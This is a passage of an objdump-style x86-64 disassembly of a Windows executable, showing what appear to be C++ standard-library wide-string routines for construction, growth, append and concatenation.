   14000337c:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140003381:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140003388:	00 
   140003389:	48 83 fb 07          	cmp    $0x7,%rbx
   14000338d:	77 30                	ja     0x1400033bf
   14000338f:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140003393:	48 85 db             	test   %rbx,%rbx
   140003396:	74 0c                	je     0x1400033a4
   140003398:	48 8b f9             	mov    %rcx,%rdi
   14000339b:	41 8b c7             	mov    %r15d,%eax
   14000339e:	48 8b cb             	mov    %rbx,%rcx
   1400033a1:	66 f3 ab             	rep stos %ax,(%rdi)
   1400033a4:	33 ed                	xor    %ebp,%ebp
   1400033a6:	66 42 89 2c 46       	mov    %bp,(%rsi,%r8,2)
   1400033ab:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400033b0:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400033b5:	48 83 c4 28          	add    $0x28,%rsp
   1400033b9:	41 5f                	pop    %r15
   1400033bb:	5f                   	pop    %rdi
   1400033bc:	5e                   	pop    %rsi
   1400033bd:	5b                   	pop    %rbx
   1400033be:	c3                   	ret
   1400033bf:	48 8b c3             	mov    %rbx,%rax
   1400033c2:	33 ed                	xor    %ebp,%ebp
   1400033c4:	48 83 c8 07          	or     $0x7,%rax
   1400033c8:	48 3b c7             	cmp    %rdi,%rax
   1400033cb:	76 10                	jbe    0x1400033dd
   1400033cd:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400033d4:	ff ff 7f 
   1400033d7:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   1400033db:	eb 2e                	jmp    0x14000340b
   1400033dd:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400033e2:	48 3b c1             	cmp    %rcx,%rax
   1400033e5:	48 0f 42 c1          	cmovb  %rcx,%rax
   1400033e9:	48 8b f8             	mov    %rax,%rdi
   1400033ec:	48 8d 48 01          	lea    0x1(%rax),%rcx
   1400033f0:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400033f7:	ff ff 7f 
   1400033fa:	48 3b c8             	cmp    %rax,%rcx
   1400033fd:	77 7e                	ja     0x14000347d
   1400033ff:	48 03 c9             	add    %rcx,%rcx
   140003402:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140003409:	72 2e                	jb     0x140003439
   14000340b:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000340f:	48 3b c1             	cmp    %rcx,%rax
   140003412:	76 69                	jbe    0x14000347d
   140003414:	48 8b c8             	mov    %rax,%rcx
   140003417:	e8 a4 09 00 00       	call   0x140003dc0
   14000341c:	48 85 c0             	test   %rax,%rax
   14000341f:	74 11                	je     0x140003432
   140003421:	48 8d 50 27          	lea    0x27(%rax),%rdx
   140003425:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   140003429:	4c 8b c2             	mov    %rdx,%r8
   14000342c:	48 89 42 f8          	mov    %rax,-0x8(%rdx)
   140003430:	eb 1f                	jmp    0x140003451
   140003432:	ff 15 d8 1d 00 00    	call   *0x1dd8(%rip)        # 0x140005210
   140003438:	cc                   	int3
   140003439:	48 85 c9             	test   %rcx,%rcx
   14000343c:	74 0d                	je     0x14000344b
   14000343e:	e8 7d 09 00 00       	call   0x140003dc0
   140003443:	48 8b d0             	mov    %rax,%rdx
   140003446:	4c 8b c0             	mov    %rax,%r8
   140003449:	eb 06                	jmp    0x140003451
   14000344b:	48 8b d5             	mov    %rbp,%rdx
   14000344e:	4c 8b c5             	mov    %rbp,%r8
   140003451:	4c 89 06             	mov    %r8,(%rsi)
   140003454:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
   140003458:	48 89 19             	mov    %rbx,(%rcx)
   14000345b:	48 8b c3             	mov    %rbx,%rax
   14000345e:	48 89 7e 18          	mov    %rdi,0x18(%rsi)
   140003462:	49 8b c7             	mov    %r15,%rax
   140003465:	48 8b fa             	mov    %rdx,%rdi
   140003468:	48 8b cb             	mov    %rbx,%rcx
   14000346b:	66 f3 ab             	rep stos %ax,(%rdi)
   14000346e:	66 89 2c 5a          	mov    %bp,(%rdx,%rbx,2)
   140003472:	e9 34 ff ff ff       	jmp    0x1400033ab
   140003477:	e8 54 de ff ff       	call   0x1400012d0
   14000347c:	cc                   	int3
   14000347d:	e8 ae dd ff ff       	call   0x140001230
   140003482:	cc                   	int3
   140003483:	cc                   	int3
   140003484:	cc                   	int3
   140003485:	cc                   	int3
   140003486:	cc                   	int3
   140003487:	cc                   	int3
   140003488:	cc                   	int3
   140003489:	cc                   	int3
   14000348a:	cc                   	int3
   14000348b:	cc                   	int3
   14000348c:	cc                   	int3
   14000348d:	cc                   	int3
   14000348e:	cc                   	int3
   14000348f:	cc                   	int3
   140003490:	40 53                	rex push %rbx
   140003492:	55                   	push   %rbp
   140003493:	56                   	push   %rsi
   140003494:	41 57                	push   %r15
   140003496:	48 83 ec 28          	sub    $0x28,%rsp
   14000349a:	48 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbp
   1400034a1:	ff ff 7f 
   1400034a4:	49 8b d8             	mov    %r8,%rbx
   1400034a7:	4c 8b fa             	mov    %rdx,%r15
   1400034aa:	48 8b f1             	mov    %rcx,%rsi
   1400034ad:	4c 3b c5             	cmp    %rbp,%r8
   1400034b0:	0f 87 01 01 00 00    	ja     0x1400035b7
   1400034b6:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400034bb:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   1400034c2:	00 
   1400034c3:	48 83 fb 07          	cmp    $0x7,%rbx
   1400034c7:	77 26                	ja     0x1400034ef
   1400034c9:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400034cd:	48 03 db             	add    %rbx,%rbx
   1400034d0:	4c 8b c3             	mov    %rbx,%r8
   1400034d3:	e8 2f 17 00 00       	call   0x140004c07
   1400034d8:	45 33 f6             	xor    %r14d,%r14d
   1400034db:	66 44 89 34 33       	mov    %r14w,(%rbx,%rsi,1)
   1400034e0:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400034e5:	48 83 c4 28          	add    $0x28,%rsp
   1400034e9:	41 5f                	pop    %r15
   1400034eb:	5e                   	pop    %rsi
   1400034ec:	5d                   	pop    %rbp
   1400034ed:	5b                   	pop    %rbx
   1400034ee:	c3                   	ret
   1400034ef:	48 8b c3             	mov    %rbx,%rax
   1400034f2:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   1400034f7:	48 83 c8 07          	or     $0x7,%rax
   1400034fb:	45 33 f6             	xor    %r14d,%r14d
   1400034fe:	48 3b c5             	cmp    %rbp,%rax
   140003501:	76 10                	jbe    0x140003513
   140003503:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000350a:	ff ff 7f 
   14000350d:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003511:	eb 32                	jmp    0x140003545
   140003513:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140003518:	48 8b e8             	mov    %rax,%rbp
   14000351b:	48 3b c1             	cmp    %rcx,%rax
   14000351e:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003525:	ff ff 7f 
   140003528:	48 0f 42 e9          	cmovb  %rcx,%rbp
   14000352c:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140003530:	48 3b c8             	cmp    %rax,%rcx
   140003533:	0f 87 84 00 00 00    	ja     0x1400035bd
   140003539:	48 03 c9             	add    %rcx,%rcx
   14000353c:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140003543:	72 2b                	jb     0x140003570
   140003545:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140003549:	48 3b c1             	cmp    %rcx,%rax
   14000354c:	76 6f                	jbe    0x1400035bd
   14000354e:	48 8b c8             	mov    %rax,%rcx
   140003551:	e8 6a 08 00 00       	call   0x140003dc0
   140003556:	48 85 c0             	test   %rax,%rax
   140003559:	74 0e                	je     0x140003569
   14000355b:	48 8d 78 27          	lea    0x27(%rax),%rdi
   14000355f:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140003563:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140003567:	eb 19                	jmp    0x140003582
   140003569:	ff 15 a1 1c 00 00    	call   *0x1ca1(%rip)        # 0x140005210
   14000356f:	cc                   	int3
   140003570:	48 85 c9             	test   %rcx,%rcx
   140003573:	74 0a                	je     0x14000357f
   140003575:	e8 46 08 00 00       	call   0x140003dc0
   14000357a:	48 8b f8             	mov    %rax,%rdi
   14000357d:	eb 03                	jmp    0x140003582
   14000357f:	49 8b fe             	mov    %r14,%rdi
   140003582:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   140003586:	49 8b d7             	mov    %r15,%rdx
   140003589:	48 03 db             	add    %rbx,%rbx
   14000358c:	48 89 3e             	mov    %rdi,(%rsi)
   14000358f:	4c 8b c3             	mov    %rbx,%r8
   140003592:	48 89 6e 18          	mov    %rbp,0x18(%rsi)
   140003596:	48 8b cf             	mov    %rdi,%rcx
   140003599:	e8 69 16 00 00       	call   0x140004c07
   14000359e:	66 44 89 34 3b       	mov    %r14w,(%rbx,%rdi,1)
   1400035a3:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400035a8:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400035ad:	48 83 c4 28          	add    $0x28,%rsp
   1400035b1:	41 5f                	pop    %r15
   1400035b3:	5e                   	pop    %rsi
   1400035b4:	5d                   	pop    %rbp
   1400035b5:	5b                   	pop    %rbx
   1400035b6:	c3                   	ret
   1400035b7:	e8 14 dd ff ff       	call   0x1400012d0
   1400035bc:	cc                   	int3
   1400035bd:	e8 6e dc ff ff       	call   0x140001230
   1400035c2:	cc                   	int3
   1400035c3:	cc                   	int3
   1400035c4:	cc                   	int3
   1400035c5:	cc                   	int3
   1400035c6:	cc                   	int3
   1400035c7:	cc                   	int3
   1400035c8:	cc                   	int3
   1400035c9:	cc                   	int3
   1400035ca:	cc                   	int3
   1400035cb:	cc                   	int3
   1400035cc:	cc                   	int3
   1400035cd:	cc                   	int3
   1400035ce:	cc                   	int3
   1400035cf:	cc                   	int3
   1400035d0:	40 53                	rex push %rbx
   1400035d2:	56                   	push   %rsi
   1400035d3:	41 56                	push   %r14
   1400035d5:	41 57                	push   %r15
   1400035d7:	48 83 ec 28          	sub    $0x28,%rsp
   1400035db:	4c 8b 71 10          	mov    0x10(%rcx),%r14
   1400035df:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   1400035e6:	ff ff 7f 
   1400035e9:	48 8b c3             	mov    %rbx,%rax
   1400035ec:	45 0f b7 f9          	movzwl %r9w,%r15d
   1400035f0:	49 2b c6             	sub    %r14,%rax
   1400035f3:	48 8b f1             	mov    %rcx,%rsi
   1400035f6:	48 83 f8 01          	cmp    $0x1,%rax
   1400035fa:	0f 82 6a 01 00 00    	jb     0x14000376a
   140003600:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140003605:	48 8b 69 18          	mov    0x18(%rcx),%rbp
   140003609:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   14000360e:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140003613:	4d 8d 66 01          	lea    0x1(%r14),%r12
   140003617:	49 8b d4             	mov    %r12,%rdx
   14000361a:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000361f:	48 83 ca 07          	or     $0x7,%rdx
   140003623:	45 33 ed             	xor    %r13d,%r13d
   140003626:	48 3b d3             	cmp    %rbx,%rdx
   140003629:	76 10                	jbe    0x14000363b
   14000362b:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003632:	ff ff 7f 
   140003635:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003639:	eb 52                	jmp    0x14000368d
   14000363b:	48 8b cd             	mov    %rbp,%rcx
   14000363e:	48 8b c3             	mov    %rbx,%rax
   140003641:	48 d1 e9             	shr    $1,%rcx
   140003644:	48 2b c1             	sub    %rcx,%rax
   140003647:	48 3b e8             	cmp    %rax,%rbp
   14000364a:	76 10                	jbe    0x14000365c
   14000364c:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003653:	ff ff 7f 
   140003656:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   14000365a:	eb 31                	jmp    0x14000368d
   14000365c:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   140003660:	48 8b da             	mov    %rdx,%rbx
   140003663:	48 3b d0             	cmp    %rax,%rdx
   140003666:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000366a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003671:	ff ff 7f 
   140003674:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140003678:	48 3b c8             	cmp    %rax,%rcx
   14000367b:	0f 87 ef 00 00 00    	ja     0x140003770
   140003681:	48 03 c9             	add    %rcx,%rcx
   140003684:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000368b:	72 2c                	jb     0x1400036b9
   14000368d:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140003691:	48 3b c1             	cmp    %rcx,%rax
   140003694:	0f 86 d6 00 00 00    	jbe    0x140003770
   14000369a:	48 8b c8             	mov    %rax,%rcx
   14000369d:	e8 1e 07 00 00       	call   0x140003dc0
   1400036a2:	48 85 c0             	test   %rax,%rax
   1400036a5:	0f 84 80 00 00 00    	je     0x14000372b
   1400036ab:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400036af:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400036b3:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400036b7:	eb 12                	jmp    0x1400036cb
   1400036b9:	48 85 c9             	test   %rcx,%rcx
   1400036bc:	74 0a                	je     0x1400036c8
   1400036be:	e8 fd 06 00 00       	call   0x140003dc0
   1400036c3:	48 8b f8             	mov    %rax,%rdi
   1400036c6:	eb 03                	jmp    0x1400036cb
   1400036c8:	49 8b fd             	mov    %r13,%rdi
   1400036cb:	4d 03 f6             	add    %r14,%r14
   1400036ce:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   1400036d2:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400036d6:	4d 8b c6             	mov    %r14,%r8
   1400036d9:	48 8b cf             	mov    %rdi,%rcx
   1400036dc:	48 83 fd 07          	cmp    $0x7,%rbp
   1400036e0:	76 50                	jbe    0x140003732
   1400036e2:	48 8b 1e             	mov    (%rsi),%rbx
   1400036e5:	48 8b d3             	mov    %rbx,%rdx
   1400036e8:	e8 1a 15 00 00       	call   0x140004c07
   1400036ed:	48 8d 14 6d 02 00 00 	lea    0x2(,%rbp,2),%rdx
   1400036f4:	00 
   1400036f5:	66 45 89 3c 3e       	mov    %r15w,(%r14,%rdi,1)
   1400036fa:	66 45 89 6c 3e 02    	mov    %r13w,0x2(%r14,%rdi,1)
   140003700:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003707:	72 18                	jb     0x140003721
   140003709:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   14000370d:	48 83 c2 27          	add    $0x27,%rdx
   140003711:	48 2b d9             	sub    %rcx,%rbx
   140003714:	48 8d 43 f8          	lea    -0x8(%rbx),%rax
   140003718:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000371c:	77 0d                	ja     0x14000372b
   14000371e:	48 8b d9             	mov    %rcx,%rbx
   140003721:	48 8b cb             	mov    %rbx,%rcx
   140003724:	e8 13 09 00 00       	call   0x14000403c
   140003729:	eb 1a                	jmp    0x140003745
   14000372b:	ff 15 df 1a 00 00    	call   *0x1adf(%rip)        # 0x140005210
   140003731:	cc                   	int3
   140003732:	48 8b d6             	mov    %rsi,%rdx
   140003735:	e8 cd 14 00 00       	call   0x140004c07
   14000373a:	66 45 89 3c 3e       	mov    %r15w,(%r14,%rdi,1)
   14000373f:	66 45 89 6c 3e 02    	mov    %r13w,0x2(%r14,%rdi,1)
   140003745:	48 89 3e             	mov    %rdi,(%rsi)
   140003748:	48 8b c6             	mov    %rsi,%rax
   14000374b:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   140003750:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140003755:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000375a:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13
   14000375f:	48 83 c4 28          	add    $0x28,%rsp
   140003763:	41 5f                	pop    %r15
   140003765:	41 5e                	pop    %r14
   140003767:	5e                   	pop    %rsi
   140003768:	5b                   	pop    %rbx
   140003769:	c3                   	ret
   14000376a:	e8 61 db ff ff       	call   0x1400012d0
   14000376f:	cc                   	int3
   140003770:	e8 bb da ff ff       	call   0x140001230
   140003775:	cc                   	int3
   140003776:	cc                   	int3
   140003777:	cc                   	int3
   140003778:	cc                   	int3
   140003779:	cc                   	int3
   14000377a:	cc                   	int3
   14000377b:	cc                   	int3
   14000377c:	cc                   	int3
   14000377d:	cc                   	int3
   14000377e:	cc                   	int3
   14000377f:	cc                   	int3
   140003780:	40 56                	rex push %rsi
   140003782:	57                   	push   %rdi
   140003783:	41 55                	push   %r13
   140003785:	41 56                	push   %r14
   140003787:	48 83 ec 38          	sub    $0x38,%rsp
   14000378b:	4c 8b 71 10          	mov    0x10(%rcx),%r14
   14000378f:	48 bf fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rdi
   140003796:	ff ff 7f 
   140003799:	48 8b c7             	mov    %rdi,%rax
   14000379c:	4d 8b e9             	mov    %r9,%r13
   14000379f:	49 2b c6             	sub    %r14,%rax
   1400037a2:	48 8b f1             	mov    %rcx,%rsi
   1400037a5:	48 3b c2             	cmp    %rdx,%rax
   1400037a8:	0f 82 91 01 00 00    	jb     0x14000393f
   1400037ae:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400037b3:	45 33 c0             	xor    %r8d,%r8d
   1400037b6:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400037bb:	48 8b 69 18          	mov    0x18(%rcx),%rbp
   1400037bf:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   1400037c4:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400037c9:	4e 8d 3c 32          	lea    (%rdx,%r14,1),%r15
   1400037cd:	49 8b d7             	mov    %r15,%rdx
   1400037d0:	48 83 ca 07          	or     $0x7,%rdx
   1400037d4:	48 3b d7             	cmp    %rdi,%rdx
   1400037d7:	76 10                	jbe    0x1400037e9
   1400037d9:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400037e0:	ff ff 7f 
   1400037e3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   1400037e7:	eb 52                	jmp    0x14000383b
   1400037e9:	48 8b cd             	mov    %rbp,%rcx
   1400037ec:	48 8b c7             	mov    %rdi,%rax
   1400037ef:	48 d1 e9             	shr    $1,%rcx
   1400037f2:	48 2b c1             	sub    %rcx,%rax
   1400037f5:	48 3b e8             	cmp    %rax,%rbp
   1400037f8:	76 10                	jbe    0x14000380a
   1400037fa:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003801:	ff ff 7f 
   140003804:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003808:	eb 31                	jmp    0x14000383b
   14000380a:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   14000380e:	48 8b fa             	mov    %rdx,%rdi
   140003811:	48 3b d0             	cmp    %rax,%rdx
   140003814:	48 0f 42 f8          	cmovb  %rax,%rdi
   140003818:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000381f:	ff ff 7f 
   140003822:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   140003826:	48 3b c8             	cmp    %rax,%rcx
   140003829:	0f 87 16 01 00 00    	ja     0x140003945
   14000382f:	48 03 c9             	add    %rcx,%rcx
   140003832:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140003839:	72 2c                	jb     0x140003867
   14000383b:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000383f:	48 3b c1             	cmp    %rcx,%rax
   140003842:	0f 86 fd 00 00 00    	jbe    0x140003945
   140003848:	48 8b c8             	mov    %rax,%rcx
   14000384b:	e8 70 05 00 00       	call   0x140003dc0
   140003850:	48 85 c0             	test   %rax,%rax
   140003853:	0f 84 9e 00 00 00    	je     0x1400038f7
   140003859:	48 8d 58 27          	lea    0x27(%rax),%rbx
   14000385d:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140003861:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140003865:	eb 12                	jmp    0x140003879
   140003867:	48 85 c9             	test   %rcx,%rcx
   14000386a:	74 0a                	je     0x140003876
   14000386c:	e8 4f 05 00 00       	call   0x140003dc0
   140003871:	48 8b d8             	mov    %rax,%rbx
   140003874:	eb 03                	jmp    0x140003879
   140003876:	49 8b d8             	mov    %r8,%rbx
   140003879:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140003880:	00 
   140003881:	4f 8d 04 36          	lea    (%r14,%r14,1),%r8
   140003885:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140003889:	4d 8d 24 18          	lea    (%r8,%rbx,1),%r12
   14000388d:	48 89 7e 18          	mov    %rdi,0x18(%rsi)
   140003891:	48 8b cb             	mov    %rbx,%rcx
   140003894:	4c 8d 3c 00          	lea    (%rax,%rax,1),%r15
   140003898:	49 03 c6             	add    %r14,%rax
   14000389b:	4c 8d 34 43          	lea    (%rbx,%rax,2),%r14
   14000389f:	48 83 fd 07          	cmp    $0x7,%rbp
   1400038a3:	76 59                	jbe    0x1400038fe
   1400038a5:	48 8b 3e             	mov    (%rsi),%rdi
   1400038a8:	48 8b d7             	mov    %rdi,%rdx
   1400038ab:	e8 57 13 00 00       	call   0x140004c07
   1400038b0:	4d 8b c7             	mov    %r15,%r8
   1400038b3:	49 8b d5             	mov    %r13,%rdx
   1400038b6:	49 8b cc             	mov    %r12,%rcx
   1400038b9:	e8 49 13 00 00       	call   0x140004c07
   1400038be:	33 c0                	xor    %eax,%eax
   1400038c0:	48 8d 14 6d 02 00 00 	lea    0x2(,%rbp,2),%rdx
   1400038c7:	00 
   1400038c8:	66 41 89 06          	mov    %ax,(%r14)
   1400038cc:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400038d3:	72 18                	jb     0x1400038ed
   1400038d5:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400038d9:	48 83 c2 27          	add    $0x27,%rdx
   1400038dd:	48 2b f9             	sub    %rcx,%rdi
   1400038e0:	48 8d 47 f8          	lea    -0x8(%rdi),%rax
   1400038e4:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400038e8:	77 0d                	ja     0x1400038f7
   1400038ea:	48 8b f9             	mov    %rcx,%rdi
   1400038ed:	48 8b cf             	mov    %rdi,%rcx
   1400038f0:	e8 47 07 00 00       	call   0x14000403c
   1400038f5:	eb 23                	jmp    0x14000391a
   1400038f7:	ff 15 13 19 00 00    	call   *0x1913(%rip)        # 0x140005210
   1400038fd:	cc                   	int3
   1400038fe:	48 8b d6             	mov    %rsi,%rdx
   140003901:	e8 01 13 00 00       	call   0x140004c07
   140003906:	4d 8b c7             	mov    %r15,%r8
   140003909:	49 8b d5             	mov    %r13,%rdx
   14000390c:	49 8b cc             	mov    %r12,%rcx
   14000390f:	e8 f3 12 00 00       	call   0x140004c07
   140003914:	33 c0                	xor    %eax,%eax
   140003916:	66 41 89 06          	mov    %ax,(%r14)
   14000391a:	48 89 1e             	mov    %rbx,(%rsi)
   14000391d:	48 8b c6             	mov    %rsi,%rax
   140003920:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   140003925:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   14000392a:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000392f:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140003934:	48 83 c4 38          	add    $0x38,%rsp
   140003938:	41 5e                	pop    %r14
   14000393a:	41 5d                	pop    %r13
   14000393c:	5f                   	pop    %rdi
   14000393d:	5e                   	pop    %rsi
   14000393e:	c3                   	ret
   14000393f:	e8 8c d9 ff ff       	call   0x1400012d0
   140003944:	cc                   	int3
   140003945:	e8 e6 d8 ff ff       	call   0x140001230
   14000394a:	cc                   	int3
   14000394b:	cc                   	int3
   14000394c:	cc                   	int3
   14000394d:	cc                   	int3
   14000394e:	cc                   	int3
   14000394f:	cc                   	int3
   140003950:	40 53                	rex push %rbx
   140003952:	48 83 ec 20          	sub    $0x20,%rsp
   140003956:	48 8b d9             	mov    %rcx,%rbx
   140003959:	ff 15 79 17 00 00    	call   *0x1779(%rip)        # 0x1400050d8
   14000395f:	84 c0                	test   %al,%al
   140003961:	75 0a                	jne    0x14000396d
   140003963:	48 8b 0b             	mov    (%rbx),%rcx
   140003966:	ff 15 8c 17 00 00    	call   *0x178c(%rip)        # 0x1400050f8
   14000396c:	90                   	nop
   14000396d:	48 8b 0b             	mov    (%rbx),%rcx
   140003970:	48 8b 01             	mov    (%rcx),%rax
   140003973:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003977:	48 8b 4c 0a 48       	mov    0x48(%rdx,%rcx,1),%rcx
   14000397c:	48 85 c9             	test   %rcx,%rcx
   14000397f:	74 07                	je     0x140003988
   140003981:	48 8b 01             	mov    (%rcx),%rax
   140003984:	ff 50 10             	call   *0x10(%rax)
   140003987:	90                   	nop
   140003988:	48 83 c4 20          	add    $0x20,%rsp
   14000398c:	5b                   	pop    %rbx
   14000398d:	c3                   	ret
   14000398e:	cc                   	int3
   14000398f:	cc                   	int3
   140003990:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003995:	55                   	push   %rbp
   140003996:	56                   	push   %rsi
   140003997:	57                   	push   %rdi
   140003998:	41 54                	push   %r12
   14000399a:	41 55                	push   %r13
   14000399c:	41 56                	push   %r14
   14000399e:	41 57                	push   %r15
   1400039a0:	48 83 ec 20          	sub    $0x20,%rsp
   1400039a4:	33 ed                	xor    %ebp,%ebp
   1400039a6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400039a9:	0f 11 01             	movups %xmm0,(%rcx)
   1400039ac:	48 89 69 10          	mov    %rbp,0x10(%rcx)
   1400039b0:	48 8b d9             	mov    %rcx,%rbx
   1400039b3:	48 89 69 18          	mov    %rbp,0x18(%rcx)
   1400039b7:	49 8b f1             	mov    %r9,%rsi
   1400039ba:	4d 8b 60 10          	mov    0x10(%r8),%r12
   1400039be:	49 8b f8             	mov    %r8,%rdi
   1400039c1:	4d 8b 79 10          	mov    0x10(%r9),%r15
   1400039c5:	49 8b 50 18          	mov    0x18(%r8),%rdx
   1400039c9:	49 8b 49 18          	mov    0x18(%r9),%rcx
   1400039cd:	48 8b c2             	mov    %rdx,%rax
   1400039d0:	49 2b c4             	sub    %r12,%rax
   1400039d3:	4f 8d 2c 27          	lea    (%r15,%r12,1),%r13
   1400039d7:	4c 3b f8             	cmp    %rax,%r15
   1400039da:	77 59                	ja     0x140003a35
   1400039dc:	48 3b ca             	cmp    %rdx,%rcx
   1400039df:	77 54                	ja     0x140003a35
   1400039e1:	41 0f 10 00          	movups (%r8),%xmm0
   1400039e5:	48 8b c3             	mov    %rbx,%rax
   1400039e8:	0f 11 03             	movups %xmm0,(%rbx)
   1400039eb:	41 0f 10 48 10       	movups 0x10(%r8),%xmm1
   1400039f0:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   1400039f4:	49 89 68 10          	mov    %rbp,0x10(%r8)
   1400039f8:	49 c7 40 18 07 00 00 	movq   $0x7,0x18(%r8)
   1400039ff:	00 
   140003a00:	66 41 89 28          	mov    %bp,(%r8)
   140003a04:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003a09:	76 03                	jbe    0x140003a0e
   140003a0b:	48 8b 03             	mov    (%rbx),%rax
   140003a0e:	49 83 79 18 07       	cmpq   $0x7,0x18(%r9)
   140003a13:	76 03                	jbe    0x140003a18
   140003a15:	49 8b 31             	mov    (%r9),%rsi
   140003a18:	4e 8d 04 7d 02 00 00 	lea    0x2(,%r15,2),%r8
   140003a1f:	00 
   140003a20:	48 8b d6             	mov    %rsi,%rdx
   140003a23:	4a 8d 0c 60          	lea    (%rax,%r12,2),%rcx
   140003a27:	e8 db 11 00 00       	call   0x140004c07
   140003a2c:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140003a30:	e9 4a 01 00 00       	jmp    0x140003b7f
   140003a35:	49 2b cf             	sub    %r15,%rcx
   140003a38:	4c 3b e1             	cmp    %rcx,%r12
   140003a3b:	77 5b                	ja     0x140003a98
   140003a3d:	41 0f 10 01          	movups (%r9),%xmm0
   140003a41:	4d 03 e4             	add    %r12,%r12
   140003a44:	4e 8d 04 7d 02 00 00 	lea    0x2(,%r15,2),%r8
   140003a4b:	00 
   140003a4c:	0f 11 03             	movups %xmm0,(%rbx)
   140003a4f:	41 0f 10 49 10       	movups 0x10(%r9),%xmm1
   140003a54:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   140003a58:	49 89 69 10          	mov    %rbp,0x10(%r9)
   140003a5c:	49 c7 41 18 07 00 00 	movq   $0x7,0x18(%r9)
   140003a63:	00 
   140003a64:	66 41 89 29          	mov    %bp,(%r9)
   140003a68:	48 8b 33             	mov    (%rbx),%rsi
   140003a6b:	48 8b d6             	mov    %rsi,%rdx
